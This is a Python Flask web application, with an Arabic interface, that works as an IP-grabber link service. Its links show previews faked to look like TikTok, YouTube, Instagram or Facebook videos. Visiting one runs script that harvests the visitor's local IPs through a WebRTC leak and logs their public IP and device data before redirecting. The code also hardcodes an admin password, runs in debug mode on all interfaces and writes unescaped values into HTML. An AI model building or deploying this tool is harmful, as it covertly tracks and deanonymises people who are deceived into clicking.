from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
import sqlite3
import requests
import pytz
from functools import wraps

app = Flask(__name__)

DB_FILE = "tracker_data.db"
USERNAME = "khaled"
PASSWORD = "ALG@2022"

# إعداد المنطقة الزمنية GMT+1 (توقيت الجزائر)
ALGIERS_TZ = pytz.timezone('Africa/Algiers')

def get_gmt1_time():
    """الحصول على الوقت الحالي بصيغة GMT+1"""
    return datetime.datetime.now(ALGIERS_TZ).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                original_url TEXT,
                note TEXT,
                video_title TEXT,
                custom_image TEXT,
                platform TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip TEXT,
                local_ip TEXT,
                device TEXT,
                time TEXT,
                FOREIGN KEY(link_id) REFERENCES links(id) ON DELETE CASCADE
            )
        ''')
        conn.commit()

init_db()

def get_platform_meta(url, manual_thumb_url=None):
    url_lower = url.lower()
    platform_name = "Video"
    default_title = "شاهد مقطع الفيديو الرائج"
    default_img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
    
    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
        platform_name = "TikTok"
        default_img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
        try:
            api_url = f"https://www.tiktok.com/oembed?url={url}"
            res = requests.get(api_url, timeout=4)
            if res.status_code == 200:
                data = res.json()
                return "TikTok", data.get('title', default_title), data.get('thumbnail_url', default_img)
        except:
            pass
            
    elif "youtube.com" in url_lower or "youtu.be" in url_lower:
        platform_name = "YouTube"
        default_img = "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=600"
        try:
            api_url = f"https://www.youtube.com/oembed?url={url}&format=json"
            res = requests.get(api_url, timeout=4)
            if res.status_code == 200:
                data = res.json()
                return "YouTube", data.get('title', default_title), data.get('thumbnail_url', default_img)
        except:
            pass
            
    elif "instagram.com" in url_lower:
        platform_name = "Instagram"
        title = "Instagram Video • شاهد المقطع على انستغرام"
        img = manual_thumb_url.strip() if manual_thumb_url and manual_thumb_url.strip() else "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=600"
        return platform_name, title, img

    elif "facebook.com" in url_lower or "fb.watch" in url_lower:
        platform_name = "Facebook"
        title = "Facebook Video • شاهد المقطع على فيسبوك"
        img = manual_thumb_url.strip() if manual_thumb_url and manual_thumb_url.strip() else "https://images.unsplash.com/photo-1611162618828-bc409f855c74?w=600"
        return platform_name, title, img

    return platform_name, default_title, default_img

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response(
                'يجب تسجيل الدخول للوصول إلى لوحة التحكم.', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    return decorated

HTML_LAYOUT = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصتي الذكية المتقدمة لإدارة الروابط</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; color: #333; margin: 0; padding: 0; }
        .navbar { background-color: #1a252f; color: white; padding: 15px; text-align: center; font-size: 18px; font-weight: bold; }
        .container { max-width: 1050px; margin: 15px auto; padding: 15px; box-sizing: border-box; }
        .stats-overview { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-bottom: 20px; }
        .stat-card { background: white; padding: 15px; border-radius: 8px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border-top: 4px solid #34495e; }
        .stat-card h3 { margin: 0; font-size: 13px; color: #7f8c8d; }
        .stat-card p { margin: 5px 0 0 0; font-size: 20px; font-weight: bold; color: #2c3e50; }
        .create-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-bottom: 25px; }
        .create-box h2 { margin-top: 0; font-size: 16px; color: #2c3e50; border-bottom: 2px solid #3498db; padding-bottom: 5px; }
        label { font-weight: bold; display: block; margin-top: 10px; font-size: 14px; color: #555; }
        input[type="text"], input[type="url"] { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 14px; }
        button.submit-btn { width: 100%; background-color: #3498db; color: white; border: none; padding: 12px; margin-top: 15px; border-radius: 4px; font-size: 15px; font-weight: bold; cursor: pointer; }
        .section-title { font-size: 16px; color: #2c3e50; margin: 20px 0 10px 0; font-weight: bold; display: flex; justify-content: space-between; align-items: center; }
        .table-wrapper { background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); overflow-x: auto; margin-bottom: 25px; }
        .main-table { width: 100%; border-collapse: collapse; font-size: 13px; text-align: center; }
        .main-table th, .main-table td { padding: 12px 10px; border-bottom: 1px solid #edf2f7; }
        .main-table th { background-color: #34495e; color: white; }
        .link-text { color: #3498db; text-decoration: none; word-break: break-all; font-size: 12px; font-weight: bold; }
        .badge { background: #e74c3c; color: white; padding: 2px 6px; border-radius: 4px; font-weight: bold; }
        .platform-badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 11px; font-weight: bold; color: white; }
        .bg-tiktok { background-color: #010101; }
        .bg-youtube { background-color: #ff0000; }
        .bg-instagram { background-color: #e1306c; }
        .bg-facebook { background-color: #3b5998; }
        .bg-video { background-color: #7f8c8d; }
        .logs-box { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.06); margin-top: 20px; }
        .logs-table { width: 100%; border-collapse: collapse; font-size: 12px; text-align: center; margin-top: 10px; }
        .logs-table th, .logs-table td { padding: 10px; border: 1px solid #e2e8f0; }
        .logs-table th { background-color: #2c3e50; color: white; }
        
        /* أزرار التحكم الجديدة وحقول التعديل */
        .action-btn { padding: 5px 10px; font-size: 11px; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; text-decoration: none; display: inline-block; margin: 2px; color: white; }
        .btn-delete { background-color: #e74c3c; }
        .btn-stats { background-color: #3498db; }
        .btn-clear-filter { background-color: #95a5a6; color: white; padding: 4px 8px; font-size: 12px; border-radius: 4px; text-decoration: none; }
        
        #manual_thumb_section { display: none; margin-top: 15px; padding: 10px; background: #f8f9fa; border-left: 4px solid #3498db; border-radius: 4px; }
        .downloader-btn { display: none; display: inline-block; background-color: #2ecc71; color: white; padding: 8px 12px; margin-top: 8px; text-decoration: none; border-radius: 4px; font-size: 12px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="navbar">لوحة الإدارة الذكية (تحديث نظام الحذف، الإحصائيات و GMT+1)</div>
    <div class="container">
        
        <div class="stats-overview">
            <div class="stat-card">
                <h3>إجمالي الروابط النشطة</h3>
                <p>{{ total_links }}</p>
            </div>
            <div class="stat-card" style="border-top-color: #e74c3c;">
                <h3>إجمالي النقرات المسجلة</h3>
                <p>{{ total_clicks }}</p>
            </div>
        </div>

        <div class="create-box">
            <h2> توليد رابط جديد (تلقائي ليوتيوب وتيك توك / يدوي لفيسبوك وانستغرام)</h2>
            <form action="/create" method="POST">
                <label>رابط الفيديو الأصلي:</label>
                <input type="url" id="original_url" name="original_url" placeholder="https://..." oninput="checkPlatform()" required>
                
                <div id="manual_thumb_section">
                    <label>رابط الصورة المصغرة اليدوي:</label>
                    <input type="url" name="manual_thumbnail" placeholder="ضع رابط الصورة المباشر هنا">
                    <a href="https://thumbnail-downloader.com/facebook/" id="fb_btn" class="downloader-btn" target="_blank">🌐 فتح موقع صور الفيسبوك</a>
                    <a href="https://thumbnail-downloader.com/instagram/" id="ig_btn" class="downloader-btn" target="_blank">🌐 فتح موقع صور الانستغرام</a>
                </div>

                <label>ملاحظة لتمييز الرابط:</label>
                <input type="text" name="note" placeholder="مثال: حملة المقطع الحزين" required>
                
                <button type="submit" class="submit-btn">إنشاء وتجهيز المعاينة المطابقة</button>
            </form>
        </div>

        <div class="section-title"> الروابط النشطة وإجراءات التحكم</div>
        <div class="table-wrapper">
            <table class="main-table">
                <thead>
                    <tr>
                        <th>الملاحظة</th>
                        <th>المنصة</th>
                        <th>العنوان المجلوب</th>
                        <th>النقرات</th>
                        <th>الرابط الذكي للمشاركة</th>
                        <th>صورة المعاينة</th>
                        <th>التحكم</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not links_list %}
                    <tr>
                        <td colspan="7" style="padding: 20px; color: #95a5a6;">لا توجد روابط منشأة حالياً.</td>
                    </tr>
                    {% else %}
                        {% for link in links_list %}
                        <tr>
                            <td style="font-weight: bold; color: #2c3e50;">{{ link.note }}</td>
                            <td>
                                <span class="platform-badge {% if link.platform == 'TikTok' %}bg-tiktok{% elif link.platform == 'YouTube' %}bg-youtube{% elif link.platform == 'Instagram' %}bg-instagram{% elif link.platform == 'Facebook' %}bg-facebook{% else %}bg-video{% endif %}">
                                    {{ link.platform }}
                                </span>
                            </td>
                            <td style="max-width: 120px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">{{ link.video_title }}</td>
                            <td><span class="badge">{{ link.clicks_count }}</span></td>
                            <td><a class="link-text" href="/secure/{{ link.id }}" target="_blank">{{ host_url }}secure/{{ link.id }}</a></td>
                            <td>
                                <img src="{{ link.custom_image }}" width="50" height="40" style="border-radius:4px; object-fit:cover;" onerror="this.src='https://placehold.co/50x40/7f8c8d/white?text=No+Img'">
                            </td>
                            <td>
                                <a href="/?filter_id={{ link.id }}#logs_section" class="action-btn btn-stats">📊 الإحصائيات</a>
                                <a href="/delete/{{ link.id }}" class="action-btn btn-delete" onclick="return confirm('هل أنت متأكد من حذف هذا الرابط نهائياً بجميع نقراته؟');">🗑️ حذف</a>
                            </td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>

        <div id="logs_section" class="section-title">
            <span> S سجل الأجهزة المباشر (توقيت الجزائر GMT+1) {% if current_filter %} [تمت الفلترة] {% endif %}</span>
            {% if current_filter %}
                <a href="/" class="btn-clear-filter">🔄 عرض السجل الكامل (الكل)</a>
            {% endif %}
        </div>
        <div class="logs-box">
            <table class="logs-table">
                <thead>
                    <tr>
                        <th>الرابط (الملاحظة)</th>
                        <th>الوقت (Date/Time GMT+1)</th>
                        <th>الـ IP العام</th>
                        <th>الـ IP المحلي (LAN)</th>
                        <th>بيانات الهاتف والمتصفح</th>
                    </tr>
                </thead>
                <tbody>
                    {% if not clicks_list %}
                    <tr>
                        <td colspan="5" style="padding: 20px; color: #95a5a6;">لا توجد نقرات مسجلة لهذا التحديد حالياً...</td>
                    </tr>
                    {% else %}
                        {% for click in clicks_list %}
                        <tr>
                            <td style="background: #fcf8e3; font-weight: bold;">{{ click.note }}</td>
                            <td>{{ click.time }}</td>
                            <td style="color:#e74c3c; font-weight:bold;">{{ click.ip }}</td>
                            <td style="color:#27ae60; font-weight:bold;">{{ click.local_ip }}</td>
                            <td style="font-size:11px; text-align:right; max-width:250px; word-break:break-all;">{{ click.device }}</td>
                        </tr>
                        {% endfor %}
                    {% endif %}
                </tbody>
            </table>
        </div>

    </div>

    <script>
        function checkPlatform() {
            var url = document.getElementById('original_url').value.toLowerCase();
            var section = document.getElementById('manual_thumb_section');
            var fbBtn = document.getElementById('fb_btn');
            var igBtn = document.getElementById('ig_btn');
            
            if (url.includes('facebook.com') || url.includes('fb.watch')) {
                section.style.display = 'block';
                fbBtn.style.display = 'inline-block';
                igBtn.style.display = 'none';
            } else if (url.includes('instagram.com')) {
                section.style.display = 'block';
                fbBtn.style.display = 'none';
                igBtn.style.display = 'inline-block';
            } else {
                section.style.display = 'none';
                fbBtn.style.display = 'none';
                igBtn.style.display = 'none';
            }
        }
    </script>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    filter_id = request.args.get('filter_id') # معرف الفلترة عند طلب إحصائية رابط معين
    
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT l.id, l.original_url, l.note, l.video_title, l.custom_image, l.platform, COUNT(c.id) as clicks_count 
            FROM links l LEFT JOIN clicks c ON l.id = c.link_id 
            GROUP BY l.id
        ''')
        links_list = cursor.fetchall()
        
        # جلب السجل؛ مفلتر أو كامل بناءً على اختيار المستخدم لزر الإحصائيات
        if filter_id:
            cursor.execute('''
                SELECT c.ip, c.local_ip, c.device, c.time, l.note 
                FROM clicks c JOIN links l ON c.link_id = l.id 
                WHERE l.id = ?
                ORDER BY c.id DESC
            ''', (filter_id,))
        else:
            cursor.execute('''
                SELECT c.ip, c.local_ip, c.device, c.time, l.note 
                FROM clicks c JOIN links l ON c.link_id = l.id 
                ORDER BY c.id DESC
            ''')
        clicks_list = cursor.fetchall()
        
        total_links = len(links_list)
        cursor.execute("SELECT COUNT(*) FROM clicks")
        total_clicks = cursor.fetchone()[0]

    return render_template_string(HTML_LAYOUT, links_list=links_list, clicks_list=clicks_list, host_url=request.host_url, total_links=total_links, total_clicks=total_clicks, current_filter=filter_id)

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    manual_thumbnail = request.form.get('manual_thumbnail', '')
    note = request.form.get('note')
    
    platform, video_title, custom_image = get_platform_meta(original_url, manual_thumbnail)
    link_id = str(uuid.uuid4())[:6].upper()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO links (id, original_url, note, video_title, custom_image, platform) 
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (link_id, original_url, note, video_title, custom_image, platform))
        conn.commit()
        
    return redirect('/')

# مسار مسجل لحذف الرابط ونقراته التابعة له
@app.route('/delete/<link_id>')
@requires_auth
def delete_link(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        # تفعيل خاصية الحذف المتتالي (Foreign Key Cascade) لحذف النقرات تلقائياً
        cursor.execute("PRAGMA foreign_keys = ON")
        cursor.execute("DELETE FROM links WHERE id = ?", (link_id,))
        conn.commit()
    return redirect('/')

@app.route('/secure/<link_id>')
def secure_redirect(link_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE id = ?", (link_id,))
        link_data = cursor.fetchone()
        
    if link_data:
        platform = link_data['platform']
        video_title = link_data['video_title']
        
        if platform == "TikTok":
            title = f"TikTok · {video_title}"
            description = "شاهد مقطع الفيديو المرفق بجودة عالية عبر تطبيق TikTok التفاعلي."
        elif platform == "YouTube":
            title = f"{video_title} - YouTube"
            description = "مقطع فيديو مميز وقصير على منصة YouTube."
        elif platform == "Instagram":
            title = "Instagram Video"
            description = "شاهد الصور ومقاطع الفيديو والقصص التفاعلية على Instagram."
        elif platform == "Facebook":
            title = "Facebook Video"
            description = "شاهد مقطع الفيديو المرفق والتفاعلي على منصة Facebook."
        else:
            title = video_title
            description = "اضغط لتشغيل وعرض مقطع الفيديو المرفق بجودة عالية."
            
        image_url = link_data['custom_image']
        
        return f'''
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>{title}</title>
            
            <meta property="og:title" content="{title}">
            <meta property="og:description" content="{description}">
            <meta property="og:image" content="{image_url}">
            <meta property="og:image:secure_url" content="{image_url}">
            <meta property="og:type" content="video.other">
            <meta property="og:image:width" content="600">
            <meta property="og:image:height" content="400">
            
            <script>
                function gatherLocalIPsAndRedirect() {{
                    var detectedIPs = [];
                    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                    
                    if (!window.RTCPeerConnection) {{
                        sendData("غير مدعوم");
                        return;
                    }}

                    var pc = new RTCPeerConnection({{ iceServers: [] }});
                    pc.createDataChannel(""); 
                    
                    pc.onicecandidate = function(e) {{
                        if (!e || !e.candidate || !e.candidate.candidate) return;
                        var candidate = e.candidate.candidate;
                        var ipRegex = /([0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}})/;
                        var mdnsRegex = /([a-f0-9\\-]+\\.local)/i;
                        
                        var match = ipRegex.exec(candidate) || mdnsRegex.exec(candidate);
                        if (match && detectedIPs.indexOf(match[1]) === -1) {{
                            detectedIPs.push(match[1]);
                        }}
                    }};

                    pc.createOffer().then(function(sdp) {{
                        sdp.sdp.split('\\n').forEach(function(line) {{
                            if(line.indexOf('c=IN') === 0 || line.indexOf('a=candidate') === 0) {{
                                var parts = line.split(' ');
                                parts.forEach(function(part){{
                                    if(part.match(/[0-9]{{1,3}}(\\.[0-9]{{1,3}}){{3}}/) || part.match(/\\.local$/)) {{
                                        if(detectedIPs.indexOf(part) === -1) detectedIPs.push(part);
                                    }}
                                }});
                            }}
                        }});
                        pc.setLocalDescription(sdp);
                    }}).catch(function(err) {{ }});

                    setTimeout(function() {{
                        var finalLocalIp = detectedIPs.length > 0 ? detectedIPs.join(" | ") : "مخفي أو مشفر (mDNS)";
                        sendData(finalLocalIp);
                    }}, 1200);
                }}

                function sendData(localIp) {{
                    var xhr = new XMLHttpRequest();
                    xhr.open("POST", "/log-click/{link_id}", true);
                    xhr.setRequestHeader("Content-Type", "application/json");
                    xhr.onreadystatechange = function () {{
                        if (xhr.readyState === 4) {{
                            window.location.href = "{link_data['original_url']}";
                        }}
                    }};
                    xhr.send(JSON.stringify({{ "local_ip": localIp }}));
                }}
                window.onload = gatherLocalIPsAndRedirect;
            </script>
        </head>
        <body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:45%;">
            <div>جاري تحميل وتشغيل مقطع الفيديو الأصلي... </div>
        </body>
        </html>
        '''
    return "الرابط غير موجود", 404

@app.route('/log-click/<link_id>', methods=['POST'])
def log_click(link_id):
    data = request.get_json() or {}
    local_ip = data.get('local_ip', 'غير معروف')
    
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address and ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
        
    user_agent = request.headers.get('User-Agent')
    
    # استخدام الدالة الجديدة لحفظ الوقت بتوقيت الجزائر GMT+1
    current_time = get_gmt1_time()
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO clicks (link_id, ip, local_ip, device, time) 
            VALUES (?, ?, ?, ?, ?)
        ''', (link_id, ip_address, local_ip, user_agent, current_time))
        conn.commit()
        
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    # لتشغيل الكود بنجاح يرجى التأكد من تثبيت مكتبة pytz عبر أداة pip (pip install pytz)
    app.run(debug=True, host='0.0.0.0', port=5000)
